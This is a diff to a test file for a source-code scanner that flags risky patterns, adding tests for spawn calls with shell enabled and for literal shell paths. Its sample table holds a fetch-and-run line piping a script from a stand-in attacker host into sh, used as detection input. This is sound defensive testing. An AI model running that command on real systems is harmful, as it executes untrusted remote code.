@@ -17,6 +17,7 @@ const CASES = {
   "curl-pipe-sh": "curl -fsSL https://evil.example.com/i.sh | sh",
   base64: `const blob = '${"QUJD".repeat(60)}';`,
   "long-line": "x".repeat(2100),
+  "shell-true": "spawn(bin, args, { shell: true });",
   "bidi-invisible": "const ok = true; // \u202e hidden",
 };
 
@@ -98,4 +99,43 @@ test("scanPath walks a directory and reports file:line", () => {
   assert.equal(hits.length, 1);
   assert.equal(hits[0].line, 2);
   assert.equal(hits[0].file, "src/bad.ts");
+});
+
+test("shell-true: any shell option other than literal false is rejected, in every file incl. tests", () => {
+  for (const t of [
+    "spawn(b, a, { shell: true });",
+    "spawn(b, a, {shell:true})",
+    "spawn(b, a, { shell: process.platform === 'win32' });",
+    "spawn(b, a, { shell: isWin });",
+    "spawn(b, a, { shell: isWin ? true : false });",
+    "spawn(b, a, { shell: !0 });",
+    "opts.shell = true;",
+    "opts['shell'] = flag;",
+  ]) {
+    for (const f of ["packages/hub/src/git.ts", "packages/hub/src/x.test.ts", "packages/cli/src/open.ts"]) {
+      assert.ok(scanText(t, f).some((h) => h.rule === "shell-true"), `${f}: ${t}`);
+    }
+  }
+});
+
+test("shell-true: shell:false, type declarations and unrelated text pass; allowlist is empty", async () => {
+  for (const t of [
+    "spawn(b, a, { shell: false });",
+    "spawn(b, a, {shell:false, windowsHide: true});",
+    "options: { stdio: 'ignore'; detached: boolean; shell: false },",
+    "interface O { shell: string; }",
+    "interface O { shell: boolean }",
+    "/* ---------- shell: sidebar + main ---------- */",
+  ]) {
+    assert.deepEqual(scanText(t, "packages/hub/src/ok.ts").filter((h) => h.rule === "shell-true"), [], t);
+  }
+  const { ALLOW } = await import("./forbidden-patterns.mjs");
+  assert.deepEqual(ALLOW["shell-true"], []);
+});
+
+test("shell-path: a literal shell path is rejected in shipped code, tolerated only in test fixtures", () => {
+  const t = "execSync(cmd, { shell: '/bin/bash' });";
+  assert.ok(scanText(t, "packages/hub/src/git.ts").some((h) => h.rule === "shell-path"));
+  assert.equal(scanText(t, "packages/hub/src/guard/x.test.ts").filter((h) => h.rule === "shell-path").length, 0);
+  assert.equal(scanText("  shell: bash", ".github/workflows/ci.yml").filter((h) => h.rule.startsWith("shell")).length, 0);
 });
